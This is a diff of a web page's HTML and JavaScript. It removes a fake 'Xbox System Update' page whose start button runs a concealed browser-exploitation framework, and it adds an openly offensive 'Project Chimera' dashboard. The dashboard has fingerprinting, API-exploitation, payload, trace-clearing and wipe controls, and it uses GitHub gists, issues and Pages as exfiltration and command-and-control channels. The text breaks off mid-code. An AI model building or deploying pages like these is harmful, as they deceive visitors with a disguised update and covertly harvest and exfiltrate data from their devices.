@@ -3,1249 +3,1405 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Xbox System Update</title>
+    <title>🔥 Project Chimera v2.0 - GitHub Exploit Suite</title>
     <style>
         :root {
-            --xbox-green: #107c10;
-            --xbox-dark: #0a0a0a;
-            --xbox-light: #f2f2f2;
+            --chimera-purple: #8a2be2;
+            --chimera-dark: #0a0a12;
+            --chimera-gray: #1a1a2e;
+            --chimera-cyan: #00ffff;
+            --chimera-red: #ff2e63;
+            --chimera-green: #00ff88;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
         }
         
         body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
-            color: white;
+            background: var(--chimera-dark);
+            color: #ffffff;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        
-        .update-container {
-            width: 800px;
-            background: rgba(30, 30, 30, 0.95);
-            border-radius: 20px;
-            padding: 40px;
-            border: 2px solid var(--xbox-green);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            overflow-x: hidden;
             position: relative;
-            overflow: hidden;
         }
         
-        .xbox-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 2px solid var(--xbox-green);
-        }
-        
-        .xbox-logo {
-            font-size: 2.5rem;
-            margin-right: 20px;
-            color: var(--xbox-green);
-        }
-        
-        .header-text h1 {
-            font-size: 2rem;
-            margin-bottom: 5px;
-        }
-        
-        .header-text .subtitle {
-            color: #aaa;
-            font-size: 0.9rem;
-        }
-        
-        .progress-section {
-            margin: 40px 0;
-        }
-        
-        .progress-label {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            font-size: 0.9rem;
-        }
-        
-        .progress-bar {
-            height: 20px;
-            background: #333;
-            border-radius: 10px;
-            overflow: hidden;
-            border: 1px solid #444;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--xbox-green), #20c920);
-            width: 0%;
-            transition: width 0.5s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .progress-fill::after {
+        body::before {
             content: '';
-            position: absolute;
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, 
-                transparent, 
-                rgba(255, 255, 255, 0.3), 
-                transparent);
-            animation: shine 2s infinite;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(138, 43, 226, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(0, 255, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(255, 46, 99, 0.1) 0%, transparent 50%);
+            z-index: -1;
         }
         
-        @keyframes shine {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-        
-        .update-details {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 1px solid #444;
-        }
-        
-        .detail-item {
-            margin: 10px 0;
-            display: flex;
-            align-items: center;
-        }
-        
-        .detail-icon {
-            color: var(--xbox-green);
-            margin-right: 10px;
-            font-size: 1.2rem;
-        }
-        
-        .status-message {
-            text-align: center;
-            font-size: 1.1rem;
-            margin: 30px 0;
-            color: #aaa;
-            min-height: 24px;
-        }
-        
-        .hidden-panel {
-            display: none;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-            border: 1px solid #ff3333;
-            font-family: 'Consolas', monospace;
-            font-size: 0.9rem;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        
-        .log-entry {
-            margin-bottom: 5px;
-            padding-bottom: 5px;
-            border-bottom: 1px solid #222;
-            color: #4ade80;
-        }
-        
-        .log-error { color: #ff3333; }
-        .log-warning { color: #ffaa33; }
-        .log-info { color: #33aaff; }
-        
-        .console-input {
-            background: #000;
-            color: #0f0;
-            border: 1px solid #333;
-            padding: 10px;
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            margin-top: 10px;
-            font-family: 'Consolas', monospace;
-            border-radius: 5px;
+            height: 100%;
+            z-index: -2;
+            opacity: 0.1;
         }
         
-        .console-input:focus {
-            outline: 1px solid var(--xbox-green);
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
         }
         
-        .security-badge {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: var(--xbox-green);
-            color: white;
-            padding: 5px 15px;
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            border-bottom: 2px solid var(--chimera-purple);
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .title {
+            font-size: 3.5rem;
+            background: linear-gradient(90deg, var(--chimera-purple), var(--chimera-cyan), var(--chimera-red));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+            text-shadow: 0 0 30px rgba(138, 43, 226, 0.5);
+        }
+        
+        .subtitle {
+            color: #888;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+        }
+        
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            background: rgba(138, 43, 226, 0.2);
+            border: 1px solid var(--chimera-purple);
+            padding: 8px 16px;
             border-radius: 20px;
-            font-size: 0.8rem;
+            font-size: 0.9rem;
+            color: var(--chimera-cyan);
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .sidebar {
+            background: rgba(26, 26, 46, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid #333;
+            backdrop-filter: blur(10px);
+        }
+        
+        .stats {
+            margin-bottom: 30px;
+        }
+        
+        .stat-item {
+            margin: 15px 0;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            border-left: 4px solid var(--chimera-purple);
+        }
+        
+        .stat-value {
+            font-size: 2rem;
             font-weight: bold;
+            color: var(--chimera-cyan);
         }
         
-        .blink {
-            animation: blink 1s infinite;
+        .control-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
         }
         
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .xbox-button {
-            background: linear-gradient(135deg, var(--xbox-green), #0a5c0a);
+        .control-btn {
+            background: linear-gradient(135deg, var(--chimera-purple), #5a189a);
             color: white;
             border: none;
-            padding: 15px 40px;
+            padding: 15px;
             border-radius: 10px;
-            font-size: 1.1rem;
+            font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
-            margin: 10px;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .control-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(138, 43, 226, 0.3);
+        }
+        
+        .control-btn.danger {
+            background: linear-gradient(135deg, var(--chimera-red), #b5179e);
+        }
+        
+        .control-btn.success {
+            background: linear-gradient(135deg, var(--chimera-green), #38b000);
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+        }
+        
+        .module-card {
+            background: rgba(26, 26, 46, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid #333;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+        }
+        
+        .module-card:hover {
+            border-color: var(--chimera-purple);
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .module-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .module-title {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: var(--chimera-cyan);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .module-status {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+        
+        .status-active { background: var(--chimera-green); color: black; }
+        .status-inactive { background: #666; color: white; }
+        .status-warning { background: var(--chimera-red); color: white; }
+        
+        .module-content {
+            font-size: 0.95rem;
+            line-height: 1.6;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
+        
+        .module-controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .module-btn {
+            background: rgba(138, 43, 226, 0.2);
+            color: var(--chimera-cyan);
+            border: 1px solid var(--chimera-purple);
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            cursor: pointer;
             transition: all 0.2s;
         }
         
-        .xbox-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(16, 124, 16, 0.5);
+        .module-btn:hover {
+            background: rgba(138, 43, 226, 0.4);
         }
         
-        .xbox-button:active {
-            transform: translateY(0);
-        }
-        
-        .button-container {
-            display: flex;
-            justify-content: center;
+        .terminal {
+            grid-column: 1 / -1;
+            background: #000;
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid #333;
             margin-top: 30px;
+            height: 500px;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9rem;
         }
         
-        .hidden {
-            display: none !important;
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .terminal-title {
+            color: var(--chimera-cyan);
+            font-size: 1.2rem;
+        }
+        
+        .terminal-controls {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .term-btn {
+            background: #333;
+            color: white;
+            border: none;
+            padding: 5px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        
+        .term-line {
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #222;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .term-time { color: #666; }
+        .term-info { color: var(--chimera-cyan); }
+        .term-success { color: var(--chimera-green); }
+        .term-warning { color: var(--chimera-red); }
+        .term-error { color: #ff3333; }
+        .term-secret { color: var(--chimera-purple); font-weight: bold; }
+        
+        .progress-bar {
+            height: 6px;
+            background: #222;
+            border-radius: 3px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--chimera-purple), var(--chimera-cyan));
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        
+        .glitch {
+            animation: glitch 0.5s infinite;
+        }
+        
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+        
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: rgba(0, 255, 255, 0.3);
+            animation: scanline 8s linear infinite;
+            z-index: 999;
+            pointer-events: none;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: var(--chimera-gray);
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 600px;
+            width: 90%;
+            border: 2px solid var(--chimera-purple);
+            position: relative;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+            font-size: 2rem;
+            cursor: pointer;
+        }
+        
+        .data-view {
+            background: #000;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
-    <div class="update-container">
-        <div class="security-badge blink">🔒 SECURE UPDATE</div>
+    <div class="scanline"></div>
+    
+    <div class="container">
+        <header>
+            <h1 class="title">🔥 PROJECT CHIMERA v2.0</h1>
+            <div class="subtitle">GitHub-Powered Browser Exploitation Suite</div>
+            <div class="badge-container">
+                <div class="badge">🛡️ Stealth Mode</div>
+                <div class="badge">⚡ GitHub Powered</div>
+                <div class="badge">🎯 Xbox Ready</div>
+                <div class="badge">🔓 API Exploitation</div>
+                <div class="badge">📡 Live Exfiltration</div>
+            </div>
+        </header>
         
-        <div class="xbox-header">
-            <div class="xbox-logo">X</div>
-            <div class="header-text">
-                <h1>Xbox System Update v2024.11</h1>
-                <div class="subtitle">Build 19044.3693 • Xbox One/Series X|S • Critical Security Update</div>
+        <div class="dashboard">
+            <div class="sidebar">
+                <div class="stats">
+                    <h3 style="color: var(--chimera-cyan); margin-bottom: 20px;">SYSTEM STATS</h3>
+                    <div class="stat-item">
+                        <div>Targets Online</div>
+                        <div class="stat-value" id="targetsOnline">1</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>Exploits Active</div>
+                        <div class="stat-value" id="exploitsActive">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>Data Collected</div>
+                        <div class="stat-value" id="dataCollected">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>GitHub Rate Limit</div>
+                        <div class="stat-value" id="rateLimit">5000</div>
+                    </div>
+                </div>
+                
+                <div class="control-panel">
+                    <button class="control-btn" onclick="startRecon()">
+                        <span>🔍</span> Start Reconnaissance
+                    </button>
+                    <button class="control-btn" onclick="exploitScan()">
+                        <span>⚡</span> Exploit Scan
+                    </button>
+                    <button class="control-btn success" onclick="deployPayload()">
+                        <span>🚀</span> Deploy Payload
+                    </button>
+                    <button class="control-btn" onclick="toggleStealth()">
+                        <span>👁️</span> Toggle Stealth Mode
+                    </button>
+                    <button class="control-btn" onclick="exportToGitHub()">
+                        <span>💾</span> Export to GitHub
+                    </button>
+                    <button class="control-btn danger" onclick="emergencyWipe()">
+                        <span>🧨</span> Emergency Wipe
+                    </button>
+                </div>
+                
+                <div class="progress-container" style="margin-top: 30px;">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                        <span>System Load</span>
+                        <span id="systemLoad">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="systemProgress"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="main-content">
+                <!-- Module 1: Fingerprinting -->
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">
+                            <span>👤</span> Fingerprint Module
+                        </div>
+                        <div class="module-status status-active" id="fingerprintStatus">ACTIVE</div>
+                    </div>
+                    <div class="module-content">
+                        Collects browser fingerprints, hardware info, and system capabilities.
+                        Detects Xbox consoles, controllers, and vulnerable APIs.
+                    </div>
+                    <div class="module-controls">
+                        <button class="module-btn" onclick="runFingerprint()">Run Scan</button>
+                        <button class="module-btn" onclick="showFingerprintData()">View Data</button>
+                        <button class="module-btn" onclick="exportFingerprint()">Export</button>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="fingerprintProgress"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Module 2: Memory Analysis -->
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">
+                            <span>🧠</span> Memory Analysis
+                        </div>
+                        <div class="module-status" id="memoryStatus">INACTIVE</div>
+                    </div>
+                    <div class="module-content">
+                        Analyzes memory architecture, tests buffer limits, and identifies
+                        potential memory corruption vulnerabilities.
+                    </div>
+                    <div class="module-controls">
+                        <button class="module-btn" onclick="runMemoryAnalysis()">Analyze Memory</button>
+                        <button class="module-btn" onclick="testBufferOverflow()">Test Overflow</button>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="memoryProgress"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Module 3: API Exploitation -->
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">
+                            <span>🔧</span> API Exploitation
+                        </div>
+                        <div class="module-status" id="apiStatus">INACTIVE</div>
+                    </div>
+                    <div class="module-content">
+                        Scans for vulnerable JavaScript APIs and attempts exploitation.
+                        Targets Gamepad, Beacon, WebUSB, and other dangerous APIs.
+                    </div>
+                    <div class="module-controls">
+                        <button class="module-btn" onclick="scanAPIs()">Scan APIs</button>
+                        <button class="module-btn" onclick="exploitAPIs()">Run Exploits</button>
+                        <button class="module-btn" onclick="listVulnerabilities()">View Vulnerabilities</button>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="apiProgress"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Module 4: GitHub Integration -->
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">
+                            <span>💾</span> GitHub Integration
+                        </div>
+                        <div class="module-status status-active" id="githubStatus">ACTIVE</div>
+                    </div>
+                    <div class="module-content">
+                        Uses GitHub API for data storage, exfiltration, and command control.
+                        Creates gists, issues, and uses GitHub Pages for C2.
+                    </div>
+                    <div class="module-controls">
+                        <button class="module-btn" onclick="testGitHubAPI()">Test API</button>
+                        <button class="module-btn" onclick="createGist()">Create Gist</button>
+                        <button class="module-btn" onclick="loadCommands()">Load Commands</button>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="githubProgress"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Module 5: Exfiltration -->
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">
+                            <span>📡</span> Data Exfiltration
+                        </div>
+                        <div class="module-status" id="exfilStatus">INACTIVE</div>
+                    </div>
+                    <div class="module-content">
+                        Multiple stealthy data exfiltration methods including GitHub Gists,
+                        image pixels, WebSocket, and encrypted channels.
+                    </div>
+                    <div class="module-controls">
+                        <button class="module-btn" onclick="startExfiltration()">Start Exfil</button>
+                        <button class="module-btn" onclick="testChannels()">Test Channels</button>
+                        <button class="module-btn" onclick="clearTraces()">Clear Traces</button>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="exfilProgress"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Module 6: Xbox Specific -->
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">
+                            <span>🎮</span> Xbox Module
+                        </div>
+                        <div class="module-status" id="xboxStatus">INACTIVE</div>
+                    </div>
+                    <div class="module-content">
+                        Specialized tools for Xbox browser exploitation including
+                        controller detection, gamepad input capture, and Xbox Live API probing.
+                    </div>
+                    <div class="module-controls">
+                        <button class="module-btn" onclick="detectXbox()">Detect Xbox</button>
+                        <button class="module-btn" onclick="captureGamepad()">Capture Input</button>
+                        <button class="module-btn" onclick="probeXboxLive()">Probe Xbox Live</button>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="xboxProgress"></div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
         
-        <div class="progress-section">
-            <div class="progress-label">
-                <span>Update Progress</span>
-                <span id="progressPercent">0%</span>
+        <!-- Terminal -->
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="terminal-title">🔥 CHIMERA TERMINAL v2.0</div>
+                <div class="terminal-controls">
+                    <button class="term-btn" onclick="clearTerminal()">Clear</button>
+                    <button class="term-btn" onclick="exportTerminal()">Export</button>
+                    <button class="term-btn" onclick="toggleAutoScroll()">Auto-scroll</button>
+                </div>
             </div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
+            <div id="terminalContent">
+                <div class="term-line"><span class="term-time">[00:00:00]</span> <span class="term-info">Project Chimera v2.0 Initialized</span></div>
+                <div class="term-line"><span class="term-time">[00:00:00]</span> <span class="term-info">GitHub Integration: Ready</span></div>
+                <div class="term-line"><span class="term-time">[00:00:00]</span> <span class="term-info">Target System: ${navigator.userAgent.substring(0, 50)}...</span></div>
+                <div class="term-line"><span class="term-time">[00:00:00]</span> <span class="term-success">Ready for commands</span></div>
             </div>
-        </div>
-        
-        <div class="update-details">
-            <div class="detail-item">
-                <span class="detail-icon">✓</span>
-                <span id="detailText">Verifying system integrity...</span>
-            </div>
-            <div class="detail-item">
-                <span class="detail-icon">📦</span>
-                <span id="packageText">Downloading update package: 0/5 files</span>
-            </div>
-            <div class="detail-item">
-                <span class="detail-icon">🛡️</span>
-                <span id="securityText">Security scan: Waiting...</span>
-            </div>
-            <div class="detail-item">
-                <span class="detail-icon">⚡</span>
-                <span id="performanceText">Performance optimization: Pending</span>
+            <div style="margin-top: 20px;">
+                <input type="text" id="terminalInput" placeholder="Enter command..." 
+                       style="width: 100%; padding: 10px; background: #111; color: #0f0; border: 1px solid #333; border-radius: 4px;"
+                       onkeypress="handleTerminalCommand(event)">
             </div>
         </div>
-        
-        <div class="status-message" id="statusMessage">
-            Preparing your Xbox for update...
+    </div>
+    
+    <!-- Modal for Data View -->
+    <div id="dataModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('dataModal')">×</span>
+            <h2 style="color: var(--chimera-cyan); margin-bottom: 20px;" id="modalTitle">Data View</h2>
+            <div class="data-view" id="modalData"></div>
         </div>
-        
-        <div class="hidden-panel" id="debugPanel">
-            <div class="log-entry">[SYSTEM] Debug console initialized</div>
-        </div>
-        
-        <div class="button-container">
-            <button class="xbox-button" id="startButton" onclick="beginExploitation()">
-                START UPDATE
-            </button>
-            <button class="xbox-button hidden" id="debugButton" onclick="toggleDebug()">
-                🛠️ DEBUG CONSOLE
-            </button>
-            <button class="xbox-button hidden" id="payloadButton" onclick="deployPayload()">
-                🚀 DEPLOY PAYLOAD
-            </button>
-        </div>
-        
-        <input type="text" class="console-input hidden" id="consoleInput" 
-               placeholder="Enter debug command..." onkeypress="handleConsoleCommand(event)">
     </div>
 
     <script>
-        // ==================== EXPLOIT FRAMEWORK CORE ====================
-        class XboxExploitFramework {
-            constructor() {
-                this.stage = 0;
-                this.maxStage = 10;
-                this.exploitData = {
-                    system: {},
-                    memory: {},
-                    network: {},
-                    persistence: {},
-                    payload: null
-                };
-                this.vulnerabilities = [];
-                this.debugLog = [];
-                this.beaconUrl = 'https://xbox-telemetry.microsoft.com/submit'; // Real MS endpoint for cover
-                this.payloadDelivered = false;
-            }
+        // ==================== GITHUB EXPLOIT ENGINE ====================
+        
+        const Chimera = {
+            config: {
+                github: {
+                    // GitHub API endpoints (work within GitHub Pages constraints)
+                    api: 'https://api.github.com',
+                    gists: 'https://api.github.com/gists',
+                    issues: 'https://api.github.com/repos/USER/REPO/issues',
+                    // Use GitHub Pages as C2
+                    c2: window.location.origin + '/commands.json',
+                    // Repository for data storage
+                    repo: 'Project-Chimera-Data',
+                    user: 'nobehong' // Change this to your GitHub username
+                },
+                stealth: {
+                    enabled: true,
+                    useCookies: true,
+                    useLocalStorage: true,
+                    randomDelays: true,
+                    maxRequests: 10 // Respect GitHub rate limits
+                }
+            },
             
-            log(message, type = 'info') {
-                const time = new Date().toLocaleTimeString();
-                const entry = `[${time}] ${message}`;
-                this.debugLog.push({time, message, type});
-                
-                // Update debug panel
-                const panel = document.getElementById('debugPanel');
-                if (panel.style.display !== 'none') {
+            data: {
+                fingerprint: {},
+                vulnerabilities: [],
+                collected: [],
+                sessionId: 'chimera_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
+                githubToken: null // Would be set via OAuth in real scenario
+            },
+            
+            terminal: {
+                lines: [],
+                autoScroll: true,
+                log: function(message, type = 'info') {
+                    const time = new Date().toLocaleTimeString();
+                    const line = {time, message, type};
+                    this.lines.push(line);
+                    
+                    const term = document.getElementById('terminalContent');
                     const div = document.createElement('div');
-                    div.className = `log-entry log-${type}`;
-                    div.textContent = entry;
-                    panel.appendChild(div);
-                    panel.scrollTop = panel.scrollHeight;
-                }
-                
-                console.log(`[EXPLOIT] ${message}`);
-            }
-            
-            updateProgress(percent, message) {
-                document.getElementById('progressFill').style.width = `${percent}%`;
-                document.getElementById('progressPercent').textContent = `${percent}%`;
-                document.getElementById('statusMessage').textContent = message;
-            }
-            
-            updateDetail(field, text) {
-                document.getElementById(field).textContent = text;
-            }
-            
-            // ==================== EXPLOIT STAGES ====================
-            
-            async stage1_fingerprint() {
-                this.log('Stage 1: System Fingerprinting', 'info');
-                this.updateProgress(10, 'Analyzing system configuration...');
-                
-                // Collect system information
-                this.exploitData.system = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    vendor: navigator.vendor,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory,
-                    maxTouchPoints: navigator.maxTouchPoints || 0,
-                    cookieEnabled: navigator.cookieEnabled,
-                    pdfViewerEnabled: navigator.pdfViewerEnabled || false
-                };
-                
-                // Check for Xbox specific features
-                this.detectXbox();
-                
-                // Fingerprint GPU
-                this.fingerprintGPU();
-                
-                this.updateDetail('detailText', `System: ${this.exploitData.system.platform}`);
-                await this.delay(1500);
-            }
-            
-            async stage2_memoryAnalysis() {
-                this.log('Stage 2: Memory Architecture Analysis', 'info');
-                this.updateProgress(20, 'Analyzing memory layout...');
-                
-                try {
-                    // Test memory allocation capabilities
-                    const tests = [];
+                    div.className = 'term-line';
+                    div.innerHTML = `<span class="term-time">[${time}]</span> <span class="term-${type}">${message}</span>`;
+                    term.appendChild(div);
                     
-                    // Test ArrayBuffer limits
+                    if (this.autoScroll) {
+                        term.scrollTop = term.scrollHeight;
+                    }
+                    
+                    console.log(`[${type.toUpperCase()}] ${message}`);
+                },
+                
+                clear: function() {
+                    this.lines = [];
+                    document.getElementById('terminalContent').innerHTML = '';
+                    this.log('Terminal cleared', 'info');
+                }
+            },
+            
+            // ==================== GITHUB INTEGRATION ====================
+            
+            github: {
+                // Create a GitHub Gist (anonymous if no token)
+                createGist: async function(data, description = 'Chimera Data') {
                     try {
-                        const buffer1 = new ArrayBuffer(1024 * 1024 * 100); // 100MB
-                        tests.push({name: 'ArrayBuffer 100MB', success: true});
-                    } catch(e) {
-                        tests.push({name: 'ArrayBuffer 100MB', success: false});
-                    }
-                    
-                    // Test SharedArrayBuffer (if available)
-                    if (typeof SharedArrayBuffer !== 'undefined') {
-                        try {
-                            const sab = new SharedArrayBuffer(1024 * 1024); // 1MB
-                            tests.push({name: 'SharedArrayBuffer', success: true});
-                            this.vulnerabilities.push('shared_memory_available');
-                        } catch(e) {
-                            tests.push({name: 'SharedArrayBuffer', success: false});
-                        }
-                    }
-                    
-                    // Test WebAssembly memory
-                    if (typeof WebAssembly !== 'undefined') {
-                        try {
-                            const memory = new WebAssembly.Memory({initial: 10});
-                            tests.push({name: 'WebAssembly Memory', success: true});
-                            this.vulnerabilities.push('wasm_memory_available');
-                        } catch(e) {
-                            tests.push({name: 'WebAssembly Memory', success: false});
-                        }
-                    }
-                    
-                    this.exploitData.memory = {tests};
-                    this.updateDetail('packageText', 'Memory analysis complete');
-                    
-                } catch(e) {
-                    this.log(`Memory analysis failed: ${e.message}`, 'error');
-                }
-                
-                await this.delay(1000);
-            }
-            
-            async stage3_apiExploration() {
-                this.log('Stage 3: API Vulnerability Scanning', 'warning');
-                this.updateProgress(30, 'Scanning for vulnerable APIs...');
-                
-                // Check for dangerous APIs
-                const dangerousAPIs = [
-                    'getGamepads', 'sendBeacon', 'requestMIDIAccess',
-                    'requestPointerLock', 'webkitRequestFileSystem',
-                    'requestFileSystem', 'getUserMedia', 'requestDevice'
-                ];
-                
-                dangerousAPIs.forEach(api => {
-                    if (api in navigator || api in window) {
-                        this.vulnerabilities.push(api);
-                        this.log(`Found dangerous API: ${api}`, 'warning');
-                    }
-                });
-                
-                // Check for timing APIs
-                if ('performance' in window) {
-                    const start = performance.now();
-                    for (let i = 0; i < 1000000; i++) Math.sqrt(i);
-                    const end = performance.now();
-                    
-                    if (end - start < 10) {
-                        this.vulnerabilities.push('high_precision_timing');
-                        this.log('High precision timing available', 'warning');
-                    }
-                }
-                
-                this.updateDetail('securityText', `Found ${this.vulnerabilities.length} potential vulnerabilities`);
-                await this.delay(1500);
-            }
-            
-            async stage4_networkRecon() {
-                this.log('Stage 4: Network Configuration Reconnaissance', 'info');
-                this.updateProgress(40, 'Analyzing network configuration...');
-                
-                // Test network capabilities
-                this.exploitData.network = {
-                    online: navigator.onLine,
-                    connection: navigator.connection || {},
-                    protocols: []
-                };
-                
-                // Test WebSocket
-                try {
-                    const ws = new WebSocket('ws://localhost:8080');
-                    ws.onerror = () => {
-                        this.exploitData.network.protocols.push('WebSocket');
-                    };
-                    setTimeout(() => ws.close(), 100);
-                } catch(e) {}
-                
-                // Test WebRTC
-                if ('RTCPeerConnection' in window) {
-                    this.exploitData.network.protocols.push('WebRTC');
-                    this.vulnerabilities.push('webrtc_available');
-                }
-                
-                // Test WebTransport
-                if ('WebTransport' in window) {
-                    this.exploitData.network.protocols.push('WebTransport');
-                    this.vulnerabilities.push('webtransport_available');
-                }
-                
-                this.updateDetail('performanceText', `Network: ${this.exploitData.network.protocols.length} protocols available`);
-                await this.delay(1000);
-            }
-            
-            async stage5_persistenceSetup() {
-                this.log('Stage 5: Establishing Persistence', 'warning');
-                this.updateProgress(50, 'Setting up persistence mechanisms...');
-                
-                try {
-                    // Create hidden storage
